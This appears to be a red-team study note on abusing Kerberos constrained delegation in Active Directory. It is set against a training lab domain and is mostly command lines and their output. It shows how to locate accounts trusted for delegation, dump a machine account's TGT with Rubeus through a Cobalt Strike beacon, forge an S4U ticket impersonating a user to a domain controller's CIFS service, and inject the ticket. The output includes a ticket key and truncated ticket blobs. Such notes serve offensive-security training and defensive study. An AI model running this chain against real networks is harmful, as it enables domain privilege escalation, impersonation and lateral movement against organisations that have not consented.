If you have compromised a user account or a computer (machine account) that has kerberos constrained delegation enabled, it's possible to impersonate any domain user (including administrator) and authenticate to a service that the user account is trusted to delegate to.

## Find
```
Get-NetUser -TrustedToAuth
```
![[Pasted image 20240917092208.png]]
or
```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json

[*] TOTAL NUMBER OF SEARCH RESULTS: 1
[
  {
    "dnshostname": "sql-2.dev.cyberbotic.io",
    "samaccountname": "SQL-2$",
    "msds-allowedtodelegateto": [
      "cifs/dc-2.dev.cyberbotic.io/dev.cyberbotic.io",
      "cifs/dc-2.dev.cyberbotic.io",
      "cifs/DC-2",
      "cifs/dc-2.dev.cyberbotic.io/DEV",
      "cifs/DC-2/DEV"
    ]
  }
]
```

## Execution
To perform the delegation, we need the TGT of the principal (computer or user) trusted for delegation.  The most direct way is to extract it with Rubeus `dump`:
```
beacon> run hostname
sql-2

beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
 --------------------------------------------------------------------------------------------------------------- 
 | LUID    | UserName                    | Service                                       | EndTime              |
 --------------------------------------------------------------------------------------------------------------- 
| 0x3e4    | sql-2$ @ DEV.CYBERBOTIC.IO  | krbtgt/DEV.CYBERBOTIC.IO                      | 9/6/2022 7:06:50 PM |

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

    ServiceName              :  krbtgt/DEV.CYBERBOTIC.IO
    ServiceRealm             :  DEV.CYBERBOTIC.IO
    UserName                 :  SQL-2$
    UserRealm                :  DEV.CYBERBOTIC.IO
    StartTime                :  9/6/2022 9:06:50 AM
    EndTime                  :  9/6/2022 7:06:50 PM
    RenewTill                :  9/13/2022 9:06:50 AM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  pj1tbiijFCGHkM6S58ShgxxPi8FvA1UB5liBqrSWPCg=
    Base64EncodedTicket   :

doIFpD[...]MuSU8=
```
With the TGT, perform an S4U request to obtain a usable TGS for CIFS on DC-2
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:sql-2$ /ticket:doIFLD[...snip...]MuSU8= /nowrap

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv

steal_token
```